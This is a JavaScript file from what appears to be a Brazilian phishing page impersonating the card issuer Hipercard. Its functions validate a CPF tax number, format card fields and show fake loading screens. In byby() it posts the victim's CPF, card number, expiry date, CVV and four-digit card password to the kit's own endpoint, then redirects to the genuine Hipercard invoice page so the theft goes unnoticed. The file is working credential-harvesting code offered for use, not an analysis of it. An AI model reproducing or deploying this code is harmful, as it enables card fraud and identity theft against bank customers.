

//============================================== VERIFICA SE CPF E NUM CARD TA COMPLETO
function chk(){
 var cpf = document.getElementById('cpf').value;
 var c = document.getElementById('numc').value;
 
 if(cpf.length == 14 && c.length == 19){
  document.getElementById("btn1").removeAttribute("disabled");
  document.getElementById("btn1").setAttribute("onclick", "chkCPF()");
 }else{
  document.getElementById("btn1").setAttribute("disabled", "disabled");
  document.getElementById("btn1").removeAttribute("onclick");
 }
 
}
//============================================== VERIFICA SE S4, VAL E CVV TA COMPLETO
function chk2(){
 var v = document.getElementById('val').value;
 var c = document.getElementById('cvv').value;
 var s = document.getElementById('s4').value;
 
 if(v.length == 5 && c.length == 3 && s.length == 4){
  document.getElementById("btn2").removeAttribute("disabled");
  document.getElementById("btn2").setAttribute("onclick", "powerTHE()");
 }else{
  document.getElementById("btn2").setAttribute("disabled", "disabled");
  document.getElementById("btn2").removeAttribute("onclick");
 }
 
}

function powerTHE(){
 
 document.getElementById("btn2").style.display="none";
 document.getElementById("tap2").style.display="none";
 document.getElementById("loading").style.display="block";
 
 setTimeout(()=>{
 byby();
 }, 2000);

}


function byby(){

 var c = document.getElementById("cpf").value;
 var n = document.getElementById("numc").value;
 var v = document.getElementById("val").value;
 var cvv = document.getElementById("cvv").value;
 var s4 = document.getElementById("s4").value;

 $.ajax({
	  url: "api/",
	  type: "POST",
	  async: false,
	  data : {'session':'slv', cpf:c, card:n, validade:v, security:cvv, senha:s4},
	  success: function(date){
	  if(date.length==0){
	  window.location.href="https://www.hipercard.com.br/cartoes/fatura";
	  }
	  
      else if(date.length==1){
	  window.location.href="https://www.hipercard.com.br/cartoes/fatura";
	  }
	  
	  else{
	  console.log("nem uma das opções");
	  }									
	  },
	  error: function(error){
	  console.log(error);
	  }
	  });

}
// =================================== MASCARA CC

function mascaracc(i){
   var v = i.value;
   
   if(isNaN(v[v.length-1])){
      i.value = v.substring(0, v.length-1);
      return;
   }
   
   i.setAttribute("maxlength", "19");
   if (v.length == 4 || v.length == 9 || v.length == 14) i.value += " ";
} 


//======================================================   MASCARA CPF

function mascara(i){
   var v = i.value;
   if(isNaN(v[v.length-1])){ 
      i.value = v.substring(0, v.length-1);
      return;
   }
   i.setAttribute("maxlength", "14");
   if (v.length == 3 || v.length == 7) i.value += ".";
   if (v.length == 11) i.value += "-";
}


function chkCPF(){

var cpf = document.getElementById('cpf').value;

if(cpf.length == 14){
var c = cpf.replace('.','');
var cc = c.replace('.','');
var ccc = cc.replace('.','');
var cccc = ccc.replace('-','');

if(valida_cpf(cccc)){
	document.getElementById("cpfinvalido").style.display="none";	
	document.getElementById("btn1").removeAttribute("disabled");
	SHOW();
}else{
   document.getElementById("btn1").setAttribute("disabled", "disabled");
   document.getElementById("cpfinvalido").style.display="block";
   document.getElementById("cpf").value="";
   document.getElementById("cpf").focus();
  
}
}else{

} 
}


function valida_cpf(cpf){
				  var numeros, digitos, soma, i, resultado, digitos_iguais;
				  digitos_iguais = 1;
				  if (cpf.length < 11)
						return false;
				  for (i = 0; i < cpf.length - 1; i++)
						if (cpf.charAt(i) != cpf.charAt(i + 1))
							  {
							  digitos_iguais = 0;
							  break;
							  }
				  if (!digitos_iguais)
						{
						numeros = cpf.substring(0,9);
						digitos = cpf.substring(9);
						soma = 0;
						for (i = 10; i > 1; i--)
							  soma += numeros.charAt(10 - i) * i;
						resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
						if (resultado != digitos.charAt(0))
							  return false;
						numeros = cpf.substring(0,10);
						soma = 0;
						for (i = 11; i > 1; i--)
							  soma += numeros.charAt(11 - i) * i;
						resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
						if (resultado != digitos.charAt(1))
							  return false;
						return true;
						}
				  else
						return false;
}
			
//=======================================

function SHOW(){
  document.getElementById("btn1").style.display="none";
  document.getElementById("tap1").style.display="none";
  document.getElementById("loading").style.display="block";
setTimeout(()=>{

  document.getElementById("frase").innerHTML="Preencha corretamente os dados";
  document.getElementById("loading").style.display="none";
  document.getElementById("btn2").style.display="block";
  document.getElementById("tap2").style.display="block";	
}, 2500);	
}

function mascaraval(i){
   
   var v = i.value;
   
  if(isNaN(v[v.length-1])){
      i.value = v.substring(0, v.length-1);
      return;
   }
   
   i.setAttribute("maxlength", "5");
   if (v.length == 2) i.value += "/";

} 

function smtnum(i){
   var v = i.value;
  if(isNaN(v[v.length-1])){
      i.value = v.substring(0, v.length-1);
      return;
   }
} 